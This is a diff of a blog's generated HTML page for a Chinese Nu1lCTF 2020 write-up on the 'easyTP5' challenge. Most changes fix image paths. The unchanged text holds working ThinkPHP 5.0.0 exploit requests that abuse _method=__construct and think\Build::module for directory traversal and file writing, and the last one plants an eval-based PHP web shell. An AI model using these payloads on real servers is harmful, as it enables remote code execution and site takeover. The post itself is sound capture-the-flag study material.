@@ -15,21 +15,21 @@
 <meta property="og:site_name" content="buxqm">
 <meta property="og:description" content="easyTP5关闭报错，写入文件下载源码看下版本，发现是5.0.0，存在任意代码执行漏洞，具体可以看看我的另一篇tp5.0.*漏洞复现，看看phpinfo。 1a=10&amp;amp;_method=__construct&amp;amp;method=GET&amp;amp;filter[]=phpinfo  发现存在disable_function和open_basedir，无法直接getshell，赛后根据出题师">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020145027341.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020152230362.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020145652540.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020153119702.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020153052014.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020155014917.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020155126218.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020155406623.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020161405045.png">
-<meta property="og:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020164325592.png">
-<meta property="og:updated_time" content="2020-10-21T14:33:57.178Z">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020145027341.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020152230362.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020145652540.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020153119702.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020153052014.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020155014917.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020155126218.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020155406623.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020161405045.png">
+<meta property="og:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020164325592.png">
+<meta property="og:updated_time" content="2020-11-28T14:19:03.593Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Nu1lCtf2020">
 <meta name="twitter:description" content="easyTP5关闭报错，写入文件下载源码看下版本，发现是5.0.0，存在任意代码执行漏洞，具体可以看看我的另一篇tp5.0.*漏洞复现，看看phpinfo。 1a=10&amp;amp;_method=__construct&amp;amp;method=GET&amp;amp;filter[]=phpinfo  发现存在disable_function和open_basedir，无法直接getshell，赛后根据出题师">
-<meta name="twitter:image" content="g:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020145027341.png">
+<meta name="twitter:image" content="http://yoursite.com/images/nu1lctf2020/image-20201020145027341.png">
   
     <link rel="alternative" href="/atom.xml" title="buxqm" type="application/atom+xml">
   
@@ -198,30 +198,30 @@
 
 <p>发现存在disable_function和open_basedir，无法直接getshell，赛后根据<a href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247484802&idx=1&sn=7db0b7acc809bc312f4ad89a718cd2d7&chksm=f9ee693dce99e02b3c6e61f0202e7916adb1fd706901b7820140677914c793570a596c5b2554&mpshare=1&scene=23&srcid=1020UndEN2WxWj2EYVvvovZZ&sharer_sharetime=1603154487174&sharer_shareid=a3b3f154db92e8d09cdde92bdb778322#rd" target="_blank" rel="noopener">出题师傅的wp</a>，将几种解法都复现一下，学习学习。</p>
 <p>在filter中可以通过someClass::someMethod调用静态方法，发现在think\Build类中，存在module静态方法可以用来写入文件。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020145027341.png" alt="image-20201020145027341"></p>
+<p><img src="/images/nu1lctf2020/image-20201020145027341.png" alt="image-20201020145027341"></p>
 <p>当module不等于runtime时，会调用buildHello静态方法，创建按hello tp界面。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020152230362.png" alt="image-20201020152230362"></p>
+<p><img src="/images/nu1lctf2020/image-20201020152230362.png" alt="image-20201020152230362"></p>
 <p>注意这行代码，我们可以控制的变量是$module</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020145652540.png" alt="image-20201020145652540"></p>
+<p><img src="/images/nu1lctf2020/image-20201020145652540.png" alt="image-20201020145652540"></p>
 <p>首先我们需要知道红圈中的内容是我们可以控制的，然后在创建目录的地方，我们可以目录穿越到public文件夹，尝试一下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=../public/555&amp;_method=__construct&amp;method=GET&amp;filter[]=think\Build::module</span><br></pre></td></tr></table></figure>
 
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020153119702.png" alt="image-20201020153119702"></p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020153052014.png" alt="image-20201020153052014"></p>
+<p><img src="/images/nu1lctf2020/image-20201020153119702.png" alt="image-20201020153119702"></p>
+<p><img src="/images/nu1lctf2020/image-20201020153052014.png" alt="image-20201020153052014"></p>
 <p>但是我们发现报错了，原因是不符合namespace的命名格式，根据出题人师傅的WP，我们可以用<code>a;&#39;/../../public/&#39;.phpinfo();</code>这种方式来绕过，我觉得非常巧妙，这种方式既成功穿越目录，有使得php文件符合语法，膜。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=a;&apos;/../../public/&apos;.phpinfo();&amp;_method=__construct&amp;method=GET&amp;filter[]=think\Build::module</span><br></pre></td></tr></table></figure>
 
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020155014917.png" alt="image-20201020155014917"></p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020155126218.png" alt="image-20201020155126218"></p>
+<p><img src="/images/nu1lctf2020/image-20201020155014917.png" alt="image-20201020155014917"></p>
+<p><img src="/images/nu1lctf2020/image-20201020155126218.png" alt="image-20201020155126218"></p>
 <p>但是这种方法只能在Windows上使用，因为linux在mkdir时，不允许有不存在的目录，但是当传入true参数是，允许有不存在目录的出现。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020155406623.png" alt="image-20201020155406623"></p>
+<p><img src="/images/nu1lctf2020/image-20201020155406623.png" alt="image-20201020155406623"></p>
 <p>这在PHP中，会抛出一个warning。但如果我们传入参数-p，就允许存在不存在的目录，这一点在php中的体现是true参数，我们传入true参数，相当于执行了<code>mkdir -p</code>，刚好我们发现，在创建默认页面时，会在执行一次mkdir，而这次带上了true参数，但是在TP中，碰到warning就抛出异常结束运行了，所以我们需要想办法绕过它，在官方手册可以看到，我们可以通过设置error_reporting来设置报错级别。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020161405045.png" alt="image-20201020161405045"></p>
+<p><img src="/images/nu1lctf2020/image-20201020161405045.png" alt="image-20201020161405045"></p>
 <p>所以我们可以执行error_reporting(‘任意字符串’)来绕过该报错，还有一个就是函数执行顺序的问题，这个出题人分析的很好了，我就不再分析了。payload如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=../public/1&amp;b=a;&apos;/../../public/&apos;.phpinfo();&amp;_method=__construct&amp;method=GET&amp;filter[0]=think\Build::module&amp;filter[1]=error_reporting</span><br></pre></td></tr></table></figure>
 
 <p>说一下执行顺序，首先创建../public1目录，然后执行error_reporting(‘../public/1’)等同于error_reporting(0)，然后就是创建我们的恶意文件，利用成功。。</p>
-<p><img src="G:%5CMyBlog%5Csource%5Cimages%5Cnu1lctf2020%5Cimage-20201020164325592.png" alt="image-20201020164325592"></p>
+<p><img src="/images/nu1lctf2020/image-20201020164325592.png" alt="image-20201020164325592"></p>
 <h2 id="注释绕过语法错误"><a href="#注释绕过语法错误" class="headerlink" title="注释绕过语法错误"></a>注释绕过语法错误</h2><p>可以通过<code>//</code>注释掉路径，然后使用<code>?&gt;</code>闭合之前的代码，再写一个新的马。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=index//../../public/?&gt;&lt;?php @eval($_POST[&apos;aa&apos;]);?&gt;&amp;_method=__construct&amp;method=GET&amp;filter[]=think\Build::module</span><br></pre></td></tr></table></figure>
 
@@ -344,8 +344,8 @@
     </a>
   
   
-    <a href="/2020/10/16/BUUCTF3/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title"></div>
+    <a href="/2020/10/12/西湖论剑/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">西湖论剑赛后复现</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -364,6 +364,19 @@
             </div>
         </div>
         
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easyTP5"><span class="toc-number">1.</span> <span class="toc-text">easyTP5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#关闭报错，写入文件"><span class="toc-number">1.1.</span> <span class="toc-text">关闭报错，写入文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注释绕过语法错误"><span class="toc-number">1.2.</span> <span class="toc-text">注释绕过语法错误</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DockerManager"><span class="toc-number">2.</span> <span class="toc-text">DockerManager</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
         
     </div>
 </aside>
